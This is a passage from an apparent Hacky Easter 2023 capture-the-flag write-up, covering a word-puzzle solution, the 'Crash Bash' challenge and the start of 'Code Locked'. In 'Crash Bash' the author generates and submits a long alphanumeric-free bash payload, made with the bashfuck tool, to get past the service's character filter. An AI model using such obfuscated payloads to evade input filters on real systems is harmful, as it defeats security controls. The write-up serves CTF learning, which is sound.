he2023{in_how_open_treat} 25
he2023{left_how_tree_big} 25
he2023{most_you_cell_nor} 25
he2023{senior_a_nor_meet} 25
he2023{to_or_smile_civil} 25
he2023{top_but_left_then} 25
...
he2023{security_first_easy_catch} 33 # only one 33 long
...
he2023{catch_interesting_above_development} 43
he2023{decade_visit_responsibility_station} 43
he2023{describe_picture_their_organization} 43
he2023{different_product_environment_price} 43
he2023{international_make_board_individual} 43
he2023{local_different_wide_administration} 43
he2023{political_service_generation_career} 43
he2023{politics_democratic_support_between} 43
</pre></table></code></div></div><h3 id="tried-flags"><span class="mr-2">Tried flags</span><a href="#tried-flags" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>he2023{worker_sister_everybody_next}    # No: Had two unique words
he2023{become_attorney_media_become}    # No: two extremely non-unique words.
he2023{memory_service_Mr_activity}      # No: (only use of a unique capitalised word)
he2023{my_PM_whole_part}                # No: re-used letters from left to right.

he2023{security_first_easy_catch}       # ??: Only one 33 long
he2023{among_American_author_agreement} # ??: All beginning with A

</pre></table></code></div></div><h3 id="solution-1"><span class="mr-2">Solution</span><a href="#solution-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Alright, here it is as a one liner:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>cat writeupfiles/singular/singular.txt | sort | uniq -c | grep ' 1 ' | awk '{print length($0), $0}' | grep $(cat writeupfiles/singular/singular.txt | sort | uniq -c | grep ' 1 ' | awk '{print length($0)}' | sort | uniq -c | grep ' 1 ' | awk '{print $2}')
</pre></table></code></div></div><p>p gross.</p><h2 id="misc"><span class="mr-2">Misc</span><a href="#misc" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><code class="language-plaintext highlighter-rouge">wf</code> is pretty nice, I didn’t know such a command existed.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>$ dnf info wf
Installed Packages
Name         : wf
Version      : 0.41
Release      : 28.fc36
Architecture : x86_64
Size         : 39 k
Source       : wf-0.41-28.fc36.src.rpm
Repository   : @System
From repo    : fedora
Summary      : Simple word frequency counter
URL          : http://www.async.com.br/~marcelo/wf/
License      : GPLv2
Description  : wf scans a text file and counts the frequency of words through the
             : whole text.
</pre></table></code></div></div><h2> Flag</h2><code> he2023{security_first_easy_catch} </code><hr><h1 id="crash-bash"> Crash Bash <a href="/writeups/HackyEaster_2023/level6-1-crash-bash.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Can you crash the bash?</p><p>The password is B4sh_br0TH3rs</p><p>Connect using nc ch.hackyeaster.com 2303</p><p>Note: The service is restarted every hour at x:00.</p><p>Hint: Some characters are forbidden, in the whole string you enter.`</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We connect and quickly find out we cannot use any lowercase letters in our commands:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre>$ nc ch.hackyeaster.com 2303
Welcome to Crash Bash!
To get the flag, call /printflag.sh with the password!
Enter "q" to quit.
----------------------
crashbash$ a
Invalid input, bash crashed!
crashbash$ b
Invalid input, bash crashed!
crashbash$ 1
/bin/bash: line 1: 1: command not found
crashbash$ 2
/bin/bash: line 1: 2: command not found
crashbash$ _
/bin/bash: line 1: _: command not found
crashbash$ A
/bin/bash: line 1: A: command not found
crashbash$
</pre></table></code></div></div><p>so we have to find a way to call <code class="language-plaintext highlighter-rouge">/printflag.sh B4sh_br0TH3rs</code> without using any lowercase letters, hmm..</p><p>Luckily we find an AMAZING program called <a href="https://github.com/0xddaa/bashfuck">bashfuck</a> which will do just that for us, convert any command to a version that doesn’t use any alphnumeric characters!</p><p>So we download it (<a href="writeupfiles/bashfuck.sh">copy here</a>), and ask it to construct our command for us:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>$ ./bashfuck.sh /printflag.sh B4sh_br0TH3rs
cmd: `/printflag.sh B4sh_br0TH3rs`
result (1960 byte): ${!#}&lt;&lt;&lt;{$\'\\${##}$((${##}&lt;&lt;$((${##}&lt;&lt;${##}))))$((${##}&lt;&lt;${##}))\\${##}$((${##}&lt;&lt;$((${##}&lt;&lt;${##}))))${##}\\${##}$(($((${##}&lt;&lt;${##}))#${##}${##}$#))$(($((${##}&lt;&lt;${##}))#${##}${##}))\\${##}$(($((${##}&lt;&lt;${
##}))#${##}$#${##}))$#\',$\'\\$#$(($((${##}&lt;&lt;${##}))#${##}$#${##}))$(($((${##}&lt;&lt;${##}))#${##}$#${##}))\\${##}$((${##}&lt;&lt;$((${##}&lt;&lt;${##}))))$(($((${##}&lt;&lt;${##}))#${##}${##}))\',
$\'\\$#$(($((${##}&lt;&lt;${##}))#${##}$#${##}))$(($((${##}&lt;&lt;${##}))#${##}${##}${##}))\\${##}$(($((${##}&lt;&lt;${##}))#${##}${##}$#))$#\\${##}$(($((${##}&lt;&lt;${##}))#${##}${##}$#))$((${##}&lt;&lt;${##}))\\${##}$(($((${##
}&lt;&lt;${##}))#${##}$#${##}))${##}\\${##}$(($((${##}&lt;&lt;${##}))#${##}$#${##}))$(($((${##}&lt;&lt;${##}))#${##}${##}$#))\\${##}$(($((${##}&lt;&lt;${##}))#${##}${##}$#))$((${##}&lt;&lt;$((${##}&lt;&lt;${##}))))\\${##}$((${##}&lt;&lt;$((${
##}&lt;&lt;${##}))))$(($((${##}&lt;&lt;${##}))#${##}${##}$#))\\${##}$(($((${##}&lt;&lt;${##}))#${##}$#${##}))$((${##}&lt;&lt;$((${##}&lt;&lt;${##}))))\\${##}$((${##}&lt;&lt;$((${##}&lt;&lt;${##}))))${##}\\${##}$((${##}&lt;&lt;$((${##}&lt;&lt;${##}))))$((
$((${##}&lt;&lt;${##}))#${##}${##}${##}))\\$#$(($((${##}&lt;&lt;${##}))#${##}$#${##}))$(($((${##}&lt;&lt;${##}))#${##}${##}$#))\\${##}$(($((${##}&lt;&lt;${##}))#${##}${##}$#))$(($((${##}&lt;&lt;${##}))#${##}${##}))\\${##}$(($((${#
#}&lt;&lt;${##}))#${##}$#${##}))$#\\$#$((${##}&lt;&lt;$((${##}&lt;&lt;${##}))))$#\\${##}$#$((${##}&lt;&lt;${##}))\\$#$(($((${##}&lt;&lt;${##}))#${##}${##}$#))$((${##}&lt;&lt;$((${##}&lt;&lt;${##}))))\\${##}$(($((${##}&lt;&lt;${##}))#${##}${##}$#))$
(($((${##}&lt;&lt;${##}))#${##}${##}))\\${##}$(($((${##}&lt;&lt;${##}))#${##}$#${##}))$#\\${##}$(($((${##}&lt;&lt;${##}))#${##}${##}))$(($((${##}&lt;&lt;${##}))#${##}${##}${##}))\\${##}$((${##}&lt;&lt;$((${##}&lt;&lt;${##}))))$((${##}&lt;&lt;
${##}))\\${##}$(($((${##}&lt;&lt;${##}))#${##}${##}$#))$((${##}&lt;&lt;${##}))\\$#$(($((${##}&lt;&lt;${##}))#${##}${##}$#))$#\\${##}$((${##}&lt;&lt;${##}))$((${##}&lt;&lt;$((${##}&lt;&lt;${##}))))\\${##}${##}$#\\$#$(($((${##}&lt;&lt;${##}))#$
{##}${##}$#))$(($((${##}&lt;&lt;${##}))#${##}${##}))\\${##}$(($((${##}&lt;&lt;${##}))#${##}${##}$#))$((${##}&lt;&lt;${##}))\\${##}$(($((${##}&lt;&lt;${##}))#${##}${##}$#))$(($((${##}&lt;&lt;${##}))#${##}${##}))\'}
</pre></table></code></div></div><p>And now we just connect to the service and enter our command:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre>$  nc ch.hackyeaster.com 2303
Welcome to Crash Bash!
To get the flag, call /printflag.sh with the password!
Enter "q" to quit.
----------------------
crashbash$ ${!#}&lt;&lt;&lt;{$\'\\${##}$((${##}&lt;&lt;$((${##}&lt;&lt;${##}))))$((${##}&lt;&lt;${##}))\\${##}$((${##}&lt;&lt;$((${##}&lt;&lt;${##}))))${##}\\${##}$(($((${##}&lt;&lt;${##}))#${##}${##}$#))$(($((${##}&lt;&lt;${##}))#${##}${##}))\\${##}$(($((${##}&lt;&lt;${
##}))#${##}$#${##}))$#\',$\'\\$#$(($((${##}&lt;&lt;${##}))#${##}$#${##}))$(($((${##}&lt;&lt;${##}))#${##}$#${##}))\\${##}$((${##}&lt;&lt;$((${##}&lt;&lt;${##}))))$(($((${##}&lt;&lt;${##}))#${##}${##}))\',
$\'\\$#$(($((${##}&lt;&lt;${##}))#${##}$#${##}))$(($((${##}&lt;&lt;${##}))#${##}${##}${##}))\\${##}$(($((${##}&lt;&lt;${##}))#${##}${##}$#))$#\\${##}$(($((${##}&lt;&lt;${##}))#${##}${##}$#))$((${##}&lt;&lt;${##}))\\${##}$(($((${##
}&lt;&lt;${##}))#${##}$#${##}))${##}\\${##}$(($((${##}&lt;&lt;${##}))#${##}$#${##}))$(($((${##}&lt;&lt;${##}))#${##}${##}$#))\\${##}$(($((${##}&lt;&lt;${##}))#${##}${##}$#))$((${##}&lt;&lt;$((${##}&lt;&lt;${##}))))\\${##}$((${##}&lt;&lt;$((${
##}&lt;&lt;${##}))))$(($((${##}&lt;&lt;${##}))#${##}${##}$#))\\${##}$(($((${##}&lt;&lt;${##}))#${##}$#${##}))$((${##}&lt;&lt;$((${##}&lt;&lt;${##}))))\\${##}$((${##}&lt;&lt;$((${##}&lt;&lt;${##}))))${##}\\${##}$((${##}&lt;&lt;$((${##}&lt;&lt;${##}))))$((
$((${##}&lt;&lt;${##}))#${##}${##}${##}))\\$#$(($((${##}&lt;&lt;${##}))#${##}$#${##}))$(($((${##}&lt;&lt;${##}))#${##}${##}$#))\\${##}$(($((${##}&lt;&lt;${##}))#${##}${##}$#))$(($((${##}&lt;&lt;${##}))#${##}${##}))\\${##}$(($((${#
#}&lt;&lt;${##}))#${##}$#${##}))$#\\$#$((${##}&lt;&lt;$((${##}&lt;&lt;${##}))))$#\\${##}$#$((${##}&lt;&lt;${##}))\\$#$(($((${##}&lt;&lt;${##}))#${##}${##}$#))$((${##}&lt;&lt;$((${##}&lt;&lt;${##}))))\\${##}$(($((${##}&lt;&lt;${##}))#${##}${##}$#))$
(($((${##}&lt;&lt;${##}))#${##}${##}))\\${##}$(($((${##}&lt;&lt;${##}))#${##}$#${##}))$#\\${##}$(($((${##}&lt;&lt;${##}))#${##}${##}))$(($((${##}&lt;&lt;${##}))#${##}${##}${##}))\\${##}$((${##}&lt;&lt;$((${##}&lt;&lt;${##}))))$((${##}&lt;&lt;
${##}))\\${##}$(($((${##}&lt;&lt;${##}))#${##}${##}$#))$((${##}&lt;&lt;${##}))\\$#$(($((${##}&lt;&lt;${##}))#${##}${##}$#))$#\\${##}$((${##}&lt;&lt;${##}))$((${##}&lt;&lt;$((${##}&lt;&lt;${##}))))\\${##}${##}$#\\$#$(($((${##}&lt;&lt;${##}))#$
{##}${##}$#))$(($((${##}&lt;&lt;${##}))#${##}${##}))\\${##}$(($((${##}&lt;&lt;${##}))#${##}${##}$#))$((${##}&lt;&lt;${##}))\\${##}$(($((${##}&lt;&lt;${##}))#${##}${##}$#))$(($((${##}&lt;&lt;${##}))#${##}${##}))\'}
Congrats, here's your flag:
he2023{gr34t_b4sh_succ3ss!}
crashbash$
</pre></table></code></div></div><p>succes!</p><h2> Flag</h2><code> he2023{gr34t_b4sh_succ3ss!} </code><hr><h1 id="code-locked"> Code Locked <a href="/writeups/HackyEaster_2023/level6-2-code-locked.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Open the code lock at http://ch.hackyeaster.com:2311 to get your 🚩 flag.</p><p>Note: The service is restarted every hour at x:00.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We get a website with a number pad, where we are told to enter 8 numbers, then hit ‘#’ to open</p><p><img src="writeupfiles/code-locked-ss.png" alt="" /></p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
</pre><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;</span>

<span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;title&gt;</span>code locked<span class="nt">&lt;/title&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"utf-8"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"viewport"</span> <span class="na">content=</span><span class="s">"width=device-width, user-scalable=no, minimum-scale=1.0, maximum-scale=1.0"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;link</span> <span class="na">type=</span><span class="s">"text/css"</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"main.css"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"jquery.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
    <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"main.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
<span class="nt">&lt;/head&gt;</span>

<span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"codelock"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;img</span> <span class="na">id=</span><span class="s">"lock"</span> <span class="na">src=</span><span class="s">"lock.png"</span> <span class="na">class=</span><span class="s">"center"</span> <span class="na">usemap=</span><span class="s">"#lockmap"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;map</span> <span class="na">name=</span><span class="s">"lockmap"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;area</span> <span class="na">shape=</span><span class="s">"circle"</span> <span class="na">coords=</span><span class="s">"111,178,32"</span> <span class="na">alt=</span><span class="s">"1"</span> <span class="na">onclick=</span><span class="s">"press('1')"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;area</span> <span class="na">shape=</span><span class="s">"circle"</span> <span class="na">coords=</span><span class="s">"200,178,32"</span> <span class="na">alt=</span><span class="s">"1"</span> <span class="na">onclick=</span><span class="s">"press('2')"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;area</span> <span class="na">shape=</span><span class="s">"circle"</span> <span class="na">coords=</span><span class="s">"283,178,32"</span> <span class="na">alt=</span><span class="s">"1"</span> <span class="na">onclick=</span><span class="s">"press('3')"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;area</span> <span class="na">shape=</span><span class="s">"circle"</span> <span class="na">coords=</span><span class="s">"111,261,32"</span> <span class="na">alt=</span><span class="s">"1"</span> <span class="na">onclick=</span><span class="s">"press('4')"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;area</span> <span class="na">shape=</span><span class="s">"circle"</span> <span class="na">coords=</span><span class="s">"200,261,32"</span> <span class="na">alt=</span><span class="s">"1"</span> <span class="na">onclick=</span><span class="s">"press('5')"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;area</span> <span class="na">shape=</span><span class="s">"circle"</span> <span class="na">coords=</span><span class="s">"283,261,32"</span> <span class="na">alt=</span><span class="s">"1"</span> <span class="na">onclick=</span><span class="s">"press('6')"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;area</span> <span class="na">shape=</span><span class="s">"circle"</span> <span class="na">coords=</span><span class="s">"111,345,32"</span> <span class="na">alt=</span><span class="s">"1"</span> <span class="na">onclick=</span><span class="s">"press('7')"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;area</span> <span class="na">shape=</span><span class="s">"circle"</span> <span class="na">coords=</span><span class="s">"200,345,32"</span> <span class="na">alt=</span><span class="s">"1"</span> <span class="na">onclick=</span><span class="s">"press('8')"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;area</span> <span class="na">shape=</span><span class="s">"circle"</span> <span class="na">coords=</span><span class="s">"283,345,32"</span> <span class="na">alt=</span><span class="s">"1"</span> <span class="na">onclick=</span><span class="s">"press('9')"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;area</span> <span class="na">shape=</span><span class="s">"circle"</span> <span class="na">coords=</span><span class="s">"111,427,32"</span> <span class="na">alt=</span><span class="s">"1"</span> <span class="na">onclick=</span><span class="s">"press('*')"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;area</span> <span class="na">shape=</span><span class="s">"circle"</span> <span class="na">coords=</span><span class="s">"200,427,32"</span> <span class="na">alt=</span><span class="s">"1"</span> <span class="na">onclick=</span><span class="s">"press('0')"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;area</span> <span class="na">shape=</span><span class="s">"circle"</span> <span class="na">coords=</span><span class="s">"283,427,32"</span> <span class="na">alt=</span><span class="s">"1"</span> <span class="na">onclick=</span><span class="s">"press('#')"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;/map&gt;</span>
        <span class="nt">&lt;img</span> <span class="na">id=</span><span class="s">"green"</span> <span class="na">class=</span><span class="s">"overlay"</span> <span class="na">src=</span><span class="s">"green.png"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;img</span> <span class="na">id=</span><span class="s">"yellow"</span> <span class="na">class=</span><span class="s">"overlay"</span> <span class="na">src=</span><span class="s">"yellow.png"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;img</span> <span class="na">id=</span><span class="s">"red"</span> <span class="na">class=</span><span class="s">"overlay"</span> <span class="na">src=</span><span class="s">"red.png"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"text"</span><span class="nt">&gt;</span>
        * to clear | 8 numbers | # open
    <span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/body&gt;</span>

<span class="nt">&lt;/html&gt;</span>
</pre></table></code></div></div><p>We look through the javascript</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
</pre><td class="rouge-code"><pre>
<span class="nx">code</span> <span class="o">=</span> <span class="dl">""</span><span class="p">;</span>

<span class="kd">var</span> <span class="nx">audioDelete</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Audio</span><span class="p">(</span><span class="dl">"</span><span class="s2">delete.mp3</span><span class="dl">"</span><span class="p">);</span>
<span class="nx">audioDelete</span><span class="p">.</span><span class="nf">load</span><span class="p">();</span>
<span class="kd">var</span> <span class="nx">audioClick</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Audio</span><span class="p">(</span><span class="dl">"</span><span class="s2">click.wav</span><span class="dl">"</span><span class="p">);</span>
<span class="nx">audioClick</span><span class="p">.</span><span class="nf">load</span><span class="p">();</span>
<span class="kd">var</span> <span class="nx">audioSuccess</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Audio</span><span class="p">(</span><span class="dl">"</span><span class="s2">success.mp3</span><span class="dl">"</span><span class="p">);</span>
<span class="nx">audioSuccess</span><span class="p">.</span><span class="nf">load</span><span class="p">();</span>
<span class="kd">var</span> <span class="nx">audioFail</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Audio</span><span class="p">(</span><span class="dl">"</span><span class="s2">fail.mp3</span><span class="dl">"</span><span class="p">);</span>
<span class="nx">audioFail</span><span class="p">.</span><span class="nf">load</span><span class="p">();</span>

<span class="nx">wasmMemory</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
<span class="nx">wasmCheck</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>

<span class="kd">function</span> <span class="nf">checkWASM</span><span class="p">(</span><span class="nx">code</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">pinArray</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Int32Array</span><span class="p">(</span><span class="nx">wasmMemory</span><span class="p">.</span><span class="nx">buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">26</span><span class="p">);</span>
    <span class="nf">encode</span><span class="p">(</span><span class="nx">code</span><span class="p">,</span> <span class="nx">pinArray</span><span class="p">);</span>
    <span class="nf">wasmCheck</span><span class="p">(</span><span class="nx">pinArray</span><span class="p">.</span><span class="nx">byteOffset</span><span class="p">,</span> <span class="nx">pinArray</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
    <span class="k">return</span> <span class="nf">decode</span><span class="p">(</span><span class="nx">pinArray</span><span class="p">);</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nf">play</span><span class="p">(</span><span class="nx">file</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">a</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Audio</span><span class="p">(</span><span class="nx">file</span><span class="p">);</span>
    <span class="nx">a</span><span class="p">.</span><span class="nf">play</span><span class="p">();</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nf">press</span><span class="p">(</span><span class="nx">input</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if </span><span class="p">(</span><span class="nx">input</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">*</span><span class="dl">"</span><span class="p">)</span> <span class="p">{</span>
        <span class="nf">play</span><span class="p">(</span><span class="dl">"</span><span class="s2">delete.mp3</span><span class="dl">"</span><span class="p">);</span>
        <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#yellow</span><span class="dl">"</span><span class="p">).</span><span class="nf">show</span><span class="p">(</span><span class="mi">0</span><span class="p">).</span><span class="nf">delay</span><span class="p">(</span><span class="mi">200</span><span class="p">).</span><span class="nf">hide</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
        <span class="nx">code</span> <span class="o">=</span> <span class="dl">""</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="k">if </span><span class="p">(</span><span class="nx">input</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">#</span><span class="dl">"</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">msg</span> <span class="o">=</span> <span class="nf">checkWASM</span><span class="p">(</span><span class="nx">code</span><span class="p">);</span>
        <span class="k">if </span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nf">startsWith</span><span class="p">(</span><span class="dl">"</span><span class="s2">he2023</span><span class="dl">"</span><span class="p">))</span> <span class="p">{</span>
            <span class="nf">play</span><span class="p">(</span><span class="dl">"</span><span class="s2">success.mp3</span><span class="dl">"</span><span class="p">);</span>
            <span class="nx">audioSuccess</span><span class="p">.</span><span class="nf">play</span><span class="p">();</span>
            <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#green</span><span class="dl">"</span><span class="p">).</span><span class="nf">show</span><span class="p">(</span><span class="mi">0</span><span class="p">).</span><span class="nf">delay</span><span class="p">(</span><span class="mi">5000</span><span class="p">).</span><span class="nf">hide</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nf">play</span><span class="p">(</span><span class="dl">"</span><span class="s2">fail.mp3</span><span class="dl">"</span><span class="p">);</span>
            <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#red</span><span class="dl">"</span><span class="p">).</span><span class="nf">show</span><span class="p">(</span><span class="mi">0</span><span class="p">).</span><span class="nf">delay</span><span class="p">(</span><span class="mi">1000</span><span class="p">).</span><span class="nf">hide</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nf">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span><span class="nf">alert</span><span class="p">(</span><span class="nx">msg</span><span class="p">);},</span> <span class="mi">200</span><span class="p">)</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#yellow</span><span class="dl">"</span><span class="p">).</span><span class="nf">show</span><span class="p">(</span><span class="mi">0</span><span class="p">).</span><span class="nf">delay</span><span class="p">(</span><span class="mi">200</span><span class="p">).</span><span class="nf">hide</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
        <span class="nf">play</span><span class="p">(</span><span class="dl">"</span><span class="s2">click.wav</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">code</span> <span class="o">=</span> <span class="p">(</span><span class="nx">code</span> <span class="o">+</span> <span class="nx">input</span><span class="p">).</span><span class="nf">substr</span><span class="p">(</span><span class="o">-</span><span class="mi">8</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kd">const</span> <span class="nx">encode</span> <span class="o">=</span> <span class="kd">function</span> <span class="nf">stringToIntegerArray</span><span class="p">(</span><span class="nx">string</span><span class="p">,</span> <span class="nx">array</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">for </span><span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">string</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">array</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">string</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nf">charCodeAt</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">};</span>

<span class="kd">const</span> <span class="nx">decode</span> <span class="o">=</span> <span class="kd">function</span> <span class="nf">integerArrayToString</span><span class="p">(</span><span class="nx">array</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">let</span> <span class="nx">string</span> <span class="o">=</span> <span class="dl">""</span><span class="p">;</span>
    <span class="k">for </span><span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">array</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">string</span> <span class="o">+=</span> <span class="nb">String</span><span class="p">.</span><span class="nf">fromCharCode</span><span class="p">(</span><span class="nx">array</span><span class="p">[</span><span class="nx">i</span><span class="p">]);</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nx">string</span><span class="p">;</span>
<span class="p">};</span>

<span class="nf">$</span><span class="p">(</span><span class="nb">document</span><span class="p">).</span><span class="nf">ready</span><span class="p">(</span><span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
    <span class="p">(</span><span class="k">async </span><span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
